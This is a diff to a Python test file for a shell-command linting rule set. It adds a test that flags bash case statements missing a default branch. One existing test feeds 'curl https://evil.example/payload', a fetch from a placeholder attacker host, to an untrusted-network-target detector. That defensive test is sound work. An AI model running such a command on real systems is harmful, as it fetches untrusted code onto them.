@@ -1,6 +1,8 @@
 from __future__ import annotations
 
 from rules.manual.shell import (
+    clear_command_caches,
+    detect_missing_default_case,
     shell_target_has_backup,
     shell_untrusted_network_target,
     shell_missing_change_ticket,
@@ -32,6 +34,21 @@ def test_shell_modifies_profile_startup() -> None:
 def test_shell_untrusted_network_target_and_none_input() -> None:
     assert shell_untrusted_network_target("", "curl https://evil.example/payload", [])
     assert not shell_untrusted_network_target("", None, [])
+
+
+def test_detect_missing_default_case_bash_case_esac() -> None:
+    clear_command_caches()
+    missing = """case $x in
+  foo) echo 1 ;;
+  bar) echo 2 ;;
+esac"""
+    assert detect_missing_default_case("", missing, [])
+    clear_command_caches()
+    has_default = """case $x in
+  foo) echo 1 ;;
+  *) echo d ;;
+esac"""
+    assert not detect_missing_default_case("", has_default, [])
 
 
 def test_shell_target_has_backup(tmp_path, monkeypatch) -> None:
